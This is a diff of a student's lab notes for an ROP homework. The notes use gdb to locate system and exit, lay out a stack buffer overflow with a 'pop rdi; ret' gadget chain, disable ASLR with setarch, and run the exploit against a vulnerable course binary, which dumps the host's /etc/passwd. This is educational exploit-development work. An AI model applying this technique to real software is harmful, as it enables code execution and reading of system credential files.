@@ -1,31 +1,33 @@
-Build exploit:
+The code was tested on "gits" linux lab host (outside gdb) using tmux enviroment
 
-dtrived5@shell:~/CS-576-ROP/HW2$ gdb vuln_prog2.bin
+---
+
+Build exploit inside GDB:
+
+- Find address of system and exit functions
+- Locate buffer address and size
+- Insert dummy string address 0x7fffffffe908 and locate string on stack
+- Update exploit with updated string address 0x7fffffffe928 and test it inside GDB
+
+$ gdb vuln_prog2.bin
 
 (gdb) break main
-Breakpoint 1 at 0x400753
 
 (gdb) run
-Starting program: /home/dtrived5/CS-576-ROP/HW2/vuln_prog2.bin 
-
-Breakpoint 1, 0x0000000000400753 in main ()
 
 (gdb) p system
 $1 = {<text variable, no debug info>} 0x7ffff7a523a0 <__libc_system>
 
 (gdb) p exit
-$3 = {<text variable, no debug info>} 0x7ffff7a47040 <__GI_exit>
+$2 = {<text variable, no debug info>} 0x7ffff7a47040 <__GI_exit>
 
 (gdb) c
-Continuing.
-
-Breakpoint 4, 0x0000000000400733 in get_text ()
 
 (gdb) x/320bx $rsp
 0x7fffffffe800:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41 ← buffer start
 0x7fffffffe900:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41 ← buffer end
 0x7fffffffe908:	0x03	0x08	0x40	0x00	0x00	0x00	0x00	0x00 ← pop rdi; ret
-0x7fffffffe910:	0x08	0xe9	0xff	0xff	0xff	0x7f	0x00	0x00 ← string address (wrong address of string in stack)
+0x7fffffffe910:	0x08	0xe9	0xff	0xff	0xff	0x7f	0x00	0x00 ← dummy string address in stack
 0x7fffffffe918:	0xa0	0x23	0xa5	0xf7	0xff	0x7f	0x00	0x00 ← system
 0x7fffffffe920:	0x40	0x70	0xa4	0xf7	0xff	0x7f	0x00	0x00 ← exit
 0x7fffffffe928:	0x2f	0x62	0x69	0x6e	0x2f	0x63	0x61	0x74 ← string start
@@ -34,13 +36,13 @@ Breakpoint 4, 0x0000000000400733 in get_text ()
 
 ---
 
-Run exploit:
+Run exploit inside GDB:
 
-dtrived5@shell:~/CS-576-ROP/HW2$ nano exploit_4.py 
+$ nano exploit_4.py 
 
-dtrived5@shell:~/CS-576-ROP/HW2$ python3 exploit_4.py > input4
+$ python3 exploit_4.py > input4
 
-dtrived5@shell:~/CS-576-ROP/HW2$ gdb vuln_prog2.bin
+$ gdb vuln_prog2.bin
 
 (gdb) break main
 Breakpoint 1 at 0x400753
@@ -89,3 +91,68 @@ root:x:0:0:root:/root:/bin/bash
 monitoring:x:450:450:monitoring:/home/monitoring:/usr/sbin/nologin
 [Inferior 1 (process 31159) exited with code 02]
 
+---
+
+After successfully exploiting the binary in GDB locate the address outside GDB by attaching a running process to GDB using tmux
+
+$ tmux
+
+bash-0:$ setarch x86_64 -R ./vuln_prog2.bin
+
+bash-1:$ ps a|grep vuln
+1096 ← ./vuln_prog2.bin
+1097 ← grep
+
+bash-1:$ gdb vuln_prog2.bin
+
+bash-1:$ (gdb) attach 1096
+
+---
+
+Run exploit
+
+$ nano malicious_input4.py 
+
+$ python3 malicious_input4.py > malicious_input4.txt
+
+dtrived5@gits:~/CS-576-ROP/HW2/Assignment02_group1$ setarch x86_64 -R ./vuln_prog2.bin < malicious_input4.txt
+Howdy dtrived5
+Echo:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+cslocal:x:1000:1000:cslocal,,,:/home/cslocal:/bin/bash
+ntp:x:111:117::/home/ntp:/bin/false
+colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
+statd:x:113:65534::/var/lib/nfs:/bin/false
+smmta:x:114:121:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
+smmsp:x:115:122:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
+puppet:x:116:123:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
+monitoring:x:450:450:monitoring:/home/monitoring:/usr/sbin/nologin
